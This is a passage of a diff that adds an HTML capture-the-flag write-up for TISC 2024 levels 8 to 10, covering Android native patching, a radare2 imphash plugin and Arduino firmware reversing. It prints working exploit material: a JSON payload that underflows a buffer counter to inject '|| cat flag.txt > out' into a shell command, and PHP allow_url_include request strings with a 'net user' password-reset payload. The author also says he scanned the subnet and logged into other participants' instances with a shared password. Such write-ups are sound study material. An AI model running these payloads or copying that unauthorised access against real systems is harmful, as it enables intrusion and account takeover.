+                str3 = str3.replace('-', '+');
+                
+                fileOutputStream.write((byte[]) Decrypt.a(payload, str2, Base64.getDecoder().decode(str3.split("\\$")[1] + "==")));
+            }
+            fileOutputStream.close();
+
+
+
+        } catch(Exception e) {
+            System.out.println("error: " + e.toString());
+        }
+    }
+}
+
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>From then on, I created a proxy app for me to load the native library and do patching to it for it to finally print out the flag</p>
+				</div>
+
+				<div class="col-12">
+					<p>I don't want to relive the pain but here whats I did</p>
+					<p>1. Patched 2 function arguments from 1 to 0x1337</p>
+					<p>2. Patched a jump table</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level8/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>I then decrypt the flag from strings.xml using AES CBC</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level8/2.jpg" />
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 9 - Imphash</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level9/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>It was an interesting challenge! Imphash stands for import hash and it is used by antivirus software to get the signature of a binary by its imports. </p>
+					<p>This challenge uses Radare2 to load the challenge imphash library which made it significant harder to debug</p>
+				</div>
+
+				<div class="col-12">
+					<p>Decompiled <code>libcoreimp.so</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+__int64 __fastcall r_cmd_imp_client(__int64 a1, __int64 a2)
+{
+  void *v3; // rax
+  __int64 *v4; // rax
+  size_t v8; // rax
+  void *v9; // rax
+  char v10[96]; // [rsp+10h] [rbp-1210h] BYREF
+  char s[16]; // [rsp+70h] [rbp-11B0h] BYREF
+  char v12[37]; // [rsp+80h] [rbp-11A0h] BYREF
+  char v13[8]; // [rsp+A5h] [rbp-117Bh] BYREF
+  __int16 v14; // [rsp+180h] [rbp-10A0h]
+  char v15[4110]; // [rsp+182h] [rbp-109Eh] BYREF
+  int v16; // [rsp+1190h] [rbp-90h]
+  int v17; // [rsp+1194h] [rbp-8Ch]
+  char *v18; // [rsp+1198h] [rbp-88h]
+  char *v19; // [rsp+11A0h] [rbp-80h]
+  char *v20; // [rsp+11A8h] [rbp-78h]
+  char *v21; // [rsp+11B0h] [rbp-70h]
+  char *v22; // [rsp+11B8h] [rbp-68h]
+  __int64 v23; // [rsp+11C0h] [rbp-60h]
+  __int64 v24; // [rsp+11C8h] [rbp-58h]
+  const char *v25; // [rsp+11D0h] [rbp-50h]
+  __int64 v26; // [rsp+11D8h] [rbp-48h]
+  __int64 v27; // [rsp+11E0h] [rbp-40h]
+  __int64 ObjectItemCaseSensitive; // [rsp+11E8h] [rbp-38h]
+  __int64 v29; // [rsp+11F0h] [rbp-30h]
+  __int64 v30; // [rsp+11F8h] [rbp-28h]
+  __int64 v31; // [rsp+1200h] [rbp-20h]
+  int m; // [rsp+120Ch] [rbp-14h]
+  int k; // [rsp+1210h] [rbp-10h]
+  int j; // [rsp+1214h] [rbp-Ch]
+  __int64 *i; // [rsp+1218h] [rbp-8h]
+
+  v31 = a1;
+  if ( !(unsigned __int8)r_str_startswith_inline(a2, &amp;unk_21A0) )
+    return 0LL;
+  v14 = 0;
+  memset(v15, 0, 0x1000uLL);
+  memset(s, 0, 0x110uLL);
+  strcpy(v12, "echo ");
+  strcpy(v13, " &gt; out");
+  v30 = r_core_cmd_str(v31, &amp;unk_21A4);
+  v29 = cJSON_Parse(v30);
+  ObjectItemCaseSensitive = cJSON_GetObjectItemCaseSensitive(v29, "bintype");
+  if ( !strncmp(*(const char **)(ObjectItemCaseSensitive + 32), "pe", 2uLL) )
+  {
+    v3 = (void *)r_core_cmd_str(v31, "aa");
+    free(v3);
+    v27 = r_core_cmd_str(v31, "iij");
+    v26 = cJSON_Parse(v27);
+    i = 0LL;
+    if ( v26 )
+      v4 = *(__int64 **)(v26 + 16);
+    else
+      v4 = 0LL;
+    for ( i = v4; i; i = (__int64 *)*i )
+    {
+      v24 = cJSON_GetObjectItemCaseSensitive(i, "libname");
+      v23 = cJSON_GetObjectItemCaseSensitive(i, "name");
+      if ( v24 &amp;&amp; v23 )
+      {
+        v22 = *(char **)(v24 + 32);
+        v21 = *(char **)(v23 + 32);
+        v20 = strpbrk(v22, ".dll");
+        if ( !v20 || v20 == v22 )
+        {
+          v19 = strpbrk(v22, ".ocx");
+          if ( !v19 || v19 == v22 )
+          {
+            v18 = strpbrk(v22, ".sys");
+            if ( !v18 || v18 == v22 )
+            {
+              puts("Invalid library name! Must end in .dll, .ocx or .sys!");
+              return 1LL;
+            }
+          }
+        }
+        v17 = strlen(v22) - 4;
+        v16 = strlen(v21);
+        if ( 4094LL - v14 &lt; (unsigned __int64)(v17 + v16) )
+        {
+          puts("Imports too long!");
+          return 1LL;
+        }
+        for ( j = 0; j &lt; v17; ++j )
+          v15[v14 + j] = tolower(v22[j]);
+        v14 += v17;
+        v15[v14++] = 46;
+        for ( k = 0; k &lt; v16; ++k )
+          v15[v14 + k] = tolower(v21[k]);
+        v14 += v16;
+        v15[v14++] = 44;
+      }
+    }
+    MD5_Init(v10);
+    v8 = strlen(v15);
+    MD5_Update(v10, v15, v8 - 1);
+    MD5_Final(s, v10);
+    v25 = "0123456789abcdef";
+    for ( m = 0; m &lt;= 15; ++m )
+    {
+      v12[2 * m + 5] = v25[(s[m] &gt;&gt; 4) &amp; 0xF];
+      v12[2 * m + 6] = v25[s[m] &amp; 0xF];
+    }
+    v9 = (void *)r_core_cmd_str(v31, v12);
+    free(v9);
+    return 1LL;
+  }
+  else
+  {
+    puts("File is not PE file!");
+    return 1LL;
+  }
+}
+					</code></pre>
+				</div>
+
+
+				<div class="col-12">
+					<p>Debugging a .so library is a challenge, but since it is calling functions such as <code>r_core_cmd_str</code> and <code>MD5_Update</code>, we can hook into it by creating our custom .so and patching the ELF imports</p>
+				</div>
+
+				<div class="col-12">
+					<p>custom_hook.c</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+#include &lt;r_types.h&gt;
+#include &lt;r_lib.h&gt;
+#include &lt;r_cmd.h&gt;
+#include &lt;r_core.h&gt;
+#include &lt;r_hash.h&gt;
+
+#include &lt;stdio.h&gt;
+
+extern void *c_core_cmd_str(void *user, char *cmd);
+
+void CD5_Update(void *ptr, char *data, int len) {
+	//r_hash_md5_update(ptr, data, len);
+
+	FILE *fp = fopen("/home/ryan/tisc2024/imphash/memdump", "w+");
+	if(!fp) {
+		return NULL;
+	}
+
+	for(char *i = data - 512; i &lt; data + 512; i++) {
+		char bit = *i &amp; 0xff;
+		fwrite(&amp;bit, sizeof(bit), 1, fp);
+	}
+
+	fclose(fp);
+
+	printf("%s\n", data);
+
+	signed short test = *(signed short*)(data - 2);
+	printf("HERE: %i\n", test);
+
+	for(int i = 0; i &lt; 2; i++) {
+		printf("%02x", data[i - 2] &amp; 0xff);
+	}
+
+	printf("\n");
+
+}
+
+char *read_file(const char *file) {
+	FILE *infp = fopen(file, "rb");
+	if(!infp) {
+		return NULL;
+	}
+	fseek(infp, 0, SEEK_END);
+	long fsize = ftell(infp);
+	char *p = malloc(fsize + 1);
+	fseek(infp, 0, SEEK_SET);
+
+	if(fread((char*)p, 1, fsize, infp)) {}
+
+	fclose(infp);
+	*(p + fsize) = '\0';
+
+	return p;
+}
+
+void *c_core_cmd_str(void *user, char *cmd) {
+	if(strstr(cmd, "iij")) {
+
+		return read_file("/home/ryan/tisc2024/imphash/data.json");
+	} else {
+		printf("%s\n", cmd);
+		return r_core_cmd_str(user, cmd);
+	}
+}
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Both and place in radare2 plugins folder</p>
+				</div>
+
+				<div class="col-12">
+					<p>From now on: </p>
+					<p>1. <code>r_cmd_imp_client</code> is patched to <code>c_cmd_imp_client</code> in <code>libcoreimp.so</code></p>
+					<p>1. <code>MD5_Update</code> is patched to <code>CD5_Update</code> in <code>libcoreimp.so</code></p>
+					<p>2. <code>libcoreimp.so</code> now loads my custom <code>libcorehook.so</code></p>
+				</div>
+
+				<div class="col-12">
+					<p>With everything patched, we can now easily inject or dump the memory</p>
+				</div>
+
+				<div class="col-12">
+					<p>After playing with it, I concluded that we can bypass the .dll, .ocx, .sys check with specific 2 character combinations such as <code>xl</code> or <code>ax</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+v20 = strpbrk(v22, ".dll");
+if ( !v20 || v20 == v22 )
+{
+  v19 = strpbrk(v22, ".ocx");
+  if ( !v19 || v19 == v22 )
+  {
+    v18 = strpbrk(v22, ".sys");
+    if ( !v18 || v18 == v22 )
+    {
+      puts("Invalid library name! Must end in .dll, .ocx or .sys!");
+      return 1LL;
+    }
+  }
+}
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>And then the file name length is subtracted by 4 and then, is appended to a 4096 bytes buffer </p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+v17 = strlen(v22) - 4; 
+					</code></pre>
+				</div>
+
+
+				<div class="col-12">
+					<p>we can bypass the .dll check with <code>xl</code> and as such, <code>strlen("xl") - 4</code> is <code>-2</code></p>
+					<p>Andddddddddd the main question is: Can we buffer underflow it and overwrite data above of it?</p>
+
+					<p>YES!</p>
+				</div>
+
+				<div class="col-12">
+					<p>Luckily for us, above the 4096 bytes buffer, there is a <code>int16_t</code> counter which is used to track the current position of the appended file names</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+__int16 v14; // [rsp+180h] [rbp-10A0h]
+char v15[4110]; // [rsp+182h] [rbp-109Eh] BYREF
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>With the ability to change the position of the counter, what else can we overwrite?</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+strcpy(v12, "echo ");
+strcpy(v13, " &gt; out");
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Yes, we can change the command that outputs the hash! The command buffer is about 200 bytes above the counter</p>
+				
+					<p><code>[command buffer] &lt;...200 bytes...&gt; [int16 counter][char 4096 buffer]</code></p>
+				</div>
+
+				<div class="col-12">
+					<p>After many tries, I crafted out a JSON payload to overwrite the counter and copy <code>flag.txt</code> to <code>out</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs json">
+[
+	{
+		"libname": "xl",
+		"name": "hh"
+	}, {
+		"libname": "omg.dll",
+		"name": "heyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyheyhxxx"
+	}, {
+		"libname": "!.dll",
+		"name": "t"
+	}, {
+		"libname": "ccccdccccsxsxsxsxsxsssssssssxx || cat flag.txt &gt; out;.dll",
+		"name": "a"
+	}
+]
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Now, I generated a fake .exe file and using PEBear, patched every import according to my crafted JSON. </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level9/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Here comes the flag! </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level9/2.png" />
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 10 - Diffuse</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level10/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Hardest level of all and there is an incident where I also unknowingly accessed to other participants instances</p>
+				</div>
+
+				<div class="col-12">
+					<p>The incident happened because the instance is hosted in a private VPC 10.0.0.0/24 and nmapping the subnet shows there are about 15 other instances running</p>
+					<p>Thinking that the other instances were part of the challenge, I tried to access with the password given to me</p>
+					<p>Which I am able to because all the instances share the same password</p>
+				</div>
+
+				<div class="col-12">
+					<p>I hope this incident doesn't void my participation. I did not mean to... haha... </p>
+				</div>
+
+				<div class="col-12">
+					<p>Ok to start off, I snuff through other instances and found some clues in access.log under C:\xampp\</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs text">
+::1 - - [20/Sep/2024:04:19:54 +0000] "POST /submit.php?%ADd+allow_url_include%3d1+%ADd+auto_%70%72%65%70%65%6e%64_file%3dphp://input HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.383"  
+::1 - - [20/Sep/2024:04:20:52 +0000] "POST /submit.php?%ADd+allow_url_include%3d1+%ADd+auto_%70%72%65%70%65%6e%64_file%3dfile:///C/Users/diffuser/Desktop/skibidi.png HTTP/1.1" 200 296 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.383"
+::1 - - [20/Sep/2024:04:21:06 +0000] "POST /submit.php?%ADd+allow_url_include%3d1+%ADd+auto_%70%72%65%70%65%6e%64_file%3dfile:///Users/diffuser/Desktop/skibidi.png HTTP/1.1" 200 311310 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.383"
+::1 - - [20/Sep/2024:04:26:38 +0000] "POST /submit.php?%ADd+allow_url_include%3d1+%ADd+auto_%70%72%65%70%65%6e%64_file%3dfile:///Users/diffuser/Desktop/cmd.txt HTTP/1.1" 200 2709 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.383"
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Using this clues, I did some research and it turns out it is a <code>allow_url_include</code> exploit</p>
+				</div>
+
+				<div class="col-12">
+					<p>I then took advantage of this exploit and used it to change the password of the other admin user <code>diffuse</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs php">
+&lt;?php echo system('net user diffuse 1a2b3c4d'); die(); ?&gt;
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>And now, we can log in using <code>diffuse</code></p>
+					<p>Running the <code>tree</code> command prints some sus folders</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs php">
+diffuse@DIFFUSE C:\Users\diffuse&gt;tree /a   
+Folder PATH listing for volume Windows
+Volume serial number is 0000006C EAA4:4451
+C:.
++---.ssh
++---Contacts
++---Desktop
+|   +---favourites
+|   \---project_incendiary
+|       +---designs
+|       +---locations
+|       \---schemetics
+
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>And also in <code>AppData</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs text">
+diffuse@DIFFUSE C:\Users\diffuse&gt;dir /a:h AppData\Roaming\Incendiary
+Volume in drive C is Windows
+Volume Serial Number is EAA4-4451
+
+Directory of C:\Users\diffuse\AppData\Roaming\Incendiary
+
+09/07/2024  02:31 PM    &lt;DIR&gt;          Schematics
+               0 File(s)              0 bytes
+               1 Dir(s)  97,150,332,928 bytes free
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>I <code>scp</code> everything to my pc</p>
+
+
+					<p>My findings are</p>
+					<p>1. firmware.hex and I knew it is an Arduino firmware :D</p>
+					<p>2. schematics.pdf shows us the schematic of the b()mb</p>
+				</div>
+
+				<div class="col-12">
+					<p>And then I saw "Wokwi" in the schematics. That saved my a$$ for almost checking out a $200 Arduino kit on Amazon HAHAHAA</p>
+				</div>
+
+				<div class="col-12">
+					<p>I then assembled the circuit on Wokwi with a custom UART chip</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level10/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Running it and I try with every strings inside firmware.hex to defuse but it doesn't work</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level10/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>With no luck, I fired up Ghidra and work my way to decompile</p>
+
+					<p>I suck at avr8 instructions but I roughly reconstructed the pseudocode</p>
+				
+					<pre><code class="hljs java">
+if(Keypad.isPressed("#")) {
+	char payload[16] = {
+		0xBA, 0x00, 0x87, 0x08, 0xF7, 0x1C, 0x57, 0xAC, 0x98, 0xB1, 0x53, 0xED,
+		0xBF, 0xC8, 0x66, 0x0F, 0xD9, 0x30, 0x76, 0xFA, 0x94, 0x61, 0x2F, 0xD4,
+		0xFE, 0xCB, 0x5F, 0xE6, 0x4F, 0xD2, 0x91, 0xCD
+	};
+
+	char key[16] = IO.readUartChip();
+	char iv[16] =  {
+		0xA3, 0xDA, 0xB1, 0x84, 0x88, 0x8A, 0xDF, 0xB0, 0x96, 0xDA, 0xC5, 0xC0,
+		0xBB, 0xC6, 0xDD, 0xC0
+	};
+
+	key = key ^ 0xe8;
+
+	AES.decrypt(key, iv, payload);
+
+	if("TISC{" in payload) {
+		IO.LCD.Write("B0mb defused")
+
+		i2c.write(payload)
+	} else {
+		IO.LCD.Write("Decryption error or no key chip")
+	}
+}
+					</code></pre>
+				</div>
+
+
+				<div class="col-12">
+					<p>Last step is finding the right key</p>
+				</div>
+
+				<div class="col-12">
+					<p>3 Days later...</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level10/3.png" />
+				</div>
+
+				<div class="col-12">
+					<p>That was so unexpected that I screamed lmao... Who would expect it to be hidden in a PDF file hahaha</p>
+				</div>
+
+				<div class="col-12">
+					<p>Now, it works! </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level10/4.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Ahhh but I'm abit too tired to wire up another i2c chip to get the flag</p>
+					<p>I decided to download a local copy of Wokwi and modify it to dump the memory once the program counter reaches <code>0x1351</code> (After the b0mb prints success)</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs java">
+(0, n._)(this, "serialInterface", void 0), (0, n._)(this, "onBreak", void 0), (0, n._)(this, "profileEvents", []), (0, n._)(this, "execute", t =&gt; {
+let {
+    cpu: e
+} = this, {
+    pcMask: i
+} = this, n = this.clock.frequency * (t / 1e3);
+
+
+
+function _arrayBufferToBase64( buffer ) {
+    var binary = '';
+    var bytes = new Uint8Array( buffer );
+    var len = bytes.byteLength;
+    for (var i = 0; i &lt; len; i++) {
+        binary += String.fromCharCode( bytes[ i ] );
+    }
+    return window.btoa( binary );
+}
+
+if(!this.www) {
+    console.log("window.open");
+    this.www = window.open("/hexview.html", "Hew View", "width=800,height=1200");
+    this.memSnapshot = [];
+    this.doneee = false;
+}
+
+for (let t = e.cycles + n; e.cycles &lt; t;) {
+    let t = e.progMem[e.pc];
+    if (this.resetActive ? e.cycles++ : K[t](e, t), e.pc &amp;= i, 38296 === t) {
+        var a;
+        if (null === (a = this.onBreak) || void 0 === a ? void 0 : a.call(this)) break
+    }
+
+    if(e.pc == 0x1351 &amp;&amp; !this.doneee) {
+        this.www.postMessage(_arrayBufferToBase64(e.data));
+        this.doneee = true;
+    }
+    
+
+    e.tick()
+}
+return !this.stopped
+});
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Memory view</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level10/5.png" />
+				</div>
+
+				<div class="col-12">
+					<p>TISC{h3y_Lo0k_1_m4d3_My_0wn_h4rdw4r3_t0k3n!}</p>
+				</div>
+			</div>
+		</div>
+
+		<script src="./js/bootstrap.min.js"></script>
+		<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+		<script>hljs.initHighlightingOnLoad();</script>
+	</body>
+</html>
